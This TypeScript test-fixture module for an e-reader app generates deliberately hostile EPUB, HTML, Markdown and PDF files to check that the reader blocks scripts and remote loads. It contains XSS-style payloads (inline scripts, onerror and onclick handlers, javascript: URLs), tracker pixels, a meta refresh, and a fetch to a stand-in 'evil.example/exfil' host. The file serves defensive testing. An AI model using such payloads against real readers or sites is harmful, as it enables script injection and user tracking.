import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { zipSync } from "fflate";
import { PDFDocument, PDFName, PDFString, StandardFonts, rgb } from "pdf-lib";

/**
 * Deliberately hostile files for the safe-reading spec, built at run time so no
 * binary fixtures live in the repo. Every attacker address ends in `.example`
 * (a reserved TLD that cannot resolve); the one real-looking link target is
 * example.org, which the spec answers itself and which may only be requested
 * after the reader confirms. Scripts try to flag `parent.__pwned_*`, so a script
 * that runs is visible from the top window.
 */

const para = (n: number) =>
  `<p>Paragraph ${n}: the quick brown fox jumps over the lazy dog while the reader scrolls through ordinary text.</p>`;

function write(name: string, data: string | Uint8Array): string {
  const dir = mkdtempSync(join(tmpdir(), "eviota-hostile-"));
  const file = join(dir, name);
  writeFileSync(file, data);
  return file;
}

export const EXTERNAL_LINK = "https://example.org/the-link";

export function makeHostileEpub(): string {
  const enc = (s: string) => new TextEncoder().encode(s);
  const files: Record<string, Uint8Array | [Uint8Array, { level: 0 }]> = {
    mimetype: [enc("application/epub+zip"), { level: 0 }],
    "META-INF/container.xml": enc(
      '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
    ),
    "OEBPS/content.opf": enc(
      '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:e2e:hostile-1</dc:identifier><dc:title>Hostile Epub</dc:title><dc:creator>Test Author</dc:creator><dc:language>en</dc:language></metadata><manifest>' +
        '<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml" properties="scripted"/>' +
        '<item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>' +
        '<item id="css" href="style.css" media-type="text/css"/>' +
        '<item id="js" href="app.js" media-type="text/javascript"/>' +
        '</manifest><spine><itemref idref="ch1"/><itemref idref="ch2"/></spine></package>',
    ),
    "OEBPS/ch1.xhtml": enc(
      '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>c1</title>' +
        '<link rel="stylesheet" href="style.css"/>' +
        '<link rel="stylesheet" href="https://css-tracker.example/remote.css"/>' +
        '<script>try{parent.__pwned_inline=1}catch(e){} try{fetch("https://evil.example/exfil")}catch(e){}</script>' +
        '<script src="app.js"></script></head><body><h1>Chapter One</h1>' +
        "<p>Real text that the reader should see.</p>" +
        para(1) +
        '<img src="https://tracker.example/pixel.gif" alt="pixel"/>' +
        '<img src="missing.png" onerror="try{parent.__pwned_onerror=1}catch(e){}" alt="bad"/>' +
        '<p onclick="try{parent.__pwned_onclick=1}catch(e){}">Click-handler paragraph.</p>' +
        `<p><a id="ext" href="${EXTERNAL_LINK}">external link</a> and <a href="javascript:parent.__pwned_jsurl=1">javascript link</a> and <a id="int" href="ch2.xhtml">next chapter</a></p>` +
        para(2) +
        "</body></html>",
    ),
    "OEBPS/ch2.xhtml": enc(
      '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>c2</title></head><body><h1>Chapter Two</h1>' +
        para(3) +
        '<img src="https://tracker2.example/second.gif" alt=""/></body></html>',
    ),
    "OEBPS/style.css": enc(
      '@import url("https://fonts.example/x.css"); body { background: url(https://css-bg.example/bg.png); color: #111 }',
    ),
    "OEBPS/app.js": enc("try{parent.__pwned_scriptfile=1}catch(e){}"),
  };
  return write("hostile.epub", zipSync(files));
}

export function makeHostileHtml(): string {
  return write(
    "hostile.html",
    `<!doctype html><html><head><meta charset="utf-8"><title>Hostile Page</title>
<base href="https://base-evil.example/">
<meta http-equiv="refresh" content="0;url=https://refresh.example/">
<link rel="stylesheet" href="https://css-tracker.example/remote.css">
<style>@import url("https://fonts.example/x.css"); body{background:url(https://css-bg.example/bg.png)}</style>
<script>try{parent.__pwned_html_inline=1}catch(e){} fetch("https://evil.example/exfil")</script>
<script src="https://script.example/app.js"></script></head>
<body onload="try{parent.__pwned_html_onload=1}catch(e){}"><h1>Hostile Page</h1>
<p>Real text of the hostile page that the reader should see.</p>${para(1)}
<img src="https://tracker.example/pixel.gif" alt="pixel" srcset="https://tracker.example/a.gif 2x">
<img src="missing.png" onerror="try{parent.__pwned_html_onerror=1}catch(e){}" alt="bad">
<iframe src="https://frame.example/"></iframe><object data="https://object.example/x"></object>
<form action="https://form.example/post" method="post"><input name="q"><button>go</button></form>
<p onclick="try{parent.__pwned_html_onclick=1}catch(e){}">Click-handler paragraph.</p>
<p><a id="ext" href="${EXTERNAL_LINK}" ping="https://ping.example/p">external link</a> and <a href="javascript:parent.__pwned_html_jsurl=1">javascript link</a> and <a href="#bottom">jump to bottom</a></p>
${para(2)}${para(3)}${para(4)}<h2 id="bottom">Bottom</h2><p>The end.</p></body></html>`,
  );
}

export function makeHostileMarkdown(): string {
  return write(
    "hostile.md",
    `# Hostile Markdown

Real text of the hostile markdown that the reader should see.

<script>try{parent.__pwned_md_script=1}catch(e){}</script>

<img src="x" onerror="try{parent.__pwned_md_onerror=1}catch(e){}" alt="bad">

![pixel](https://tracker.example/md.gif)

<a id="rawext" href="${EXTERNAL_LINK}">raw html link</a>

[markdown link](${EXTERNAL_LINK}) and [js link](javascript:parent.__pwned_md_jsurl=1)

${Array.from({ length: 8 }, (_, i) => `Paragraph ${i + 1}: the quick brown fox jumps over the lazy dog.`).join("\n\n")}
`,
  );
}

/**
 * Two pages. Page 1 has an external URI link and a `javascript:` URI link drawn
 * over text, and an internal link to page 2. A mouse has to be able to reach
 * each of them.
 */
export async function makeLinkPdf(): Promise<string> {
  const doc = await PDFDocument.create();
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const p1 = doc.addPage([420, 594]);
  const p2 = doc.addPage([420, 594]);
  p1.drawText("Link PDF", { x: 40, y: 520, size: 32, font, color: rgb(0, 0, 0) });
  p1.drawText("External link here", { x: 40, y: 460, size: 18, font, color: rgb(0, 0, 0.8) });
  p1.drawText("JavaScript link here", { x: 40, y: 400, size: 18, font, color: rgb(0, 0, 0.8) });
  p1.drawText("Go to page two", { x: 40, y: 340, size: 18, font, color: rgb(0, 0, 0.8) });
  p2.drawText("Second page", { x: 40, y: 520, size: 32, font, color: rgb(0, 0, 0) });
  const ctx = doc.context;
  const uri = (rect: number[], target: string) =>
    ctx.register(
      ctx.obj({
        Type: "Annot",
        Subtype: "Link",
        Rect: rect,
        Border: [0, 0, 0],
        A: { Type: "Action", S: "URI", URI: PDFString.of(target) },
      }),
    );
  const external = uri([36, 452, 220, 480], EXTERNAL_LINK);
  const script = uri([36, 392, 240, 420], "javascript:app.alert(1)");
  const internal = ctx.register(
    ctx.obj({
      Type: "Annot",
      Subtype: "Link",
      Rect: [36, 332, 220, 360],
      Border: [0, 0, 0],
      Dest: [p2.ref, PDFName.of("Fit")],
    }),
  );
  p1.node.set(PDFName.of("Annots"), ctx.obj([external, script, internal]));
  return write("link.pdf", await doc.save());
}

/**
 * The book the old-marks spec restores records into: the same section as the EPUB that the real
 * marks from an earlier build were made on (same blocks in the same order, so the text offsets and
 * the CFIs match the recorded ones), without the hostile parts, which have their own specs.
 */
export function makeMarkEpub(): string {
  const enc = (s: string) => new TextEncoder().encode(s);
  const files: Record<string, Uint8Array | [Uint8Array, { level: 0 }]> = {
    mimetype: [enc("application/epub+zip"), { level: 0 }],
    "META-INF/container.xml": enc(
      '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
    ),
    "OEBPS/content.opf": enc(
      '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:e2e:marks-1</dc:identifier><dc:title>Mark Probe</dc:title><dc:creator>Test Author</dc:creator><dc:language>en</dc:language></metadata><manifest>' +
        '<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>' +
        '<item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>' +
        '</manifest><spine><itemref idref="ch1"/><itemref idref="ch2"/></spine></package>',
    ),
    "OEBPS/ch1.xhtml": enc(
      '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>c1</title></head><body><h1>Chapter One</h1>' +
        '<p id="target">Real text that the reader should see. Highlight this sentence for the export check.</p>' +
        para(1) +
        para(2) +
        '<img id="px" src="missing-1.png" alt="pixel"/>' +
        '<img id="bad" src="missing-2.png" alt="bad"/>' +
        '<img id="svgimg" src="missing-3.png" alt="svg"/>' +
        "<p>Click-handler paragraph.</p>" +
        '<p><a id="ext" href="https://example.org/read-more">external link</a> and <a id="js" href="https://example.org/js">javascript link</a> and <a id="int" href="ch2.xhtml">next chapter</a></p>' +
        para(3) +
        para(4) +
        para(5) +
        "</body></html>",
    ),
    "OEBPS/ch2.xhtml": enc(
      '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>c2</title></head><body><h1>Chapter Two</h1>' +
        para(6) +
        para(7) +
        "</body></html>",
    ),
  };
  return write("marks.epub", zipSync(files));
}

/**
 * A small EPUB written the way most real ones are, with line breaks and indentation between
 * the blocks, one paragraph followed by another and one followed by an image. A triple click on
 * each ends in a different place in the DOM, and both used to be stored wrongly or not at all.
 */
export const PROSE = {
  alpha: "Alpha paragraph: the quick brown fox jumps over the lazy dog while the reader scrolls.",
  beta: "Beta paragraph: the quick brown fox jumps over the lazy dog while the reader scrolls.",
  gamma: "Gamma paragraph: the quick brown fox jumps over the lazy dog while the reader scrolls.",
};

export function makeProseEpub(): string {
  const enc = (s: string) => new TextEncoder().encode(s);
  const files: Record<string, Uint8Array | [Uint8Array, { level: 0 }]> = {
    mimetype: [enc("application/epub+zip"), { level: 0 }],
    "META-INF/container.xml": enc(
      '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
    ),
    "OEBPS/content.opf": enc(
      '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:e2e:prose-1</dc:identifier><dc:title>Prose Book</dc:title><dc:creator>Test Author</dc:creator><dc:language>en</dc:language></metadata><manifest><item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="ch1"/></spine></package>',
    ),
    "OEBPS/ch1.xhtml": enc(
      `<?xml version="1.0"?>\n<html xmlns="http://www.w3.org/1999/xhtml">\n  <head><title>c1</title></head>\n  <body>\n    <h1>Chapter One</h1>\n    <p id="a">${PROSE.alpha}</p>\n    <p id="b">${PROSE.beta}</p>\n    <img src="missing.png" alt="x"/>\n    <p id="c">${PROSE.gamma}</p>\n  </body>\n</html>\n`,
    ),
  };
  return write("prose.epub", zipSync(files));
}
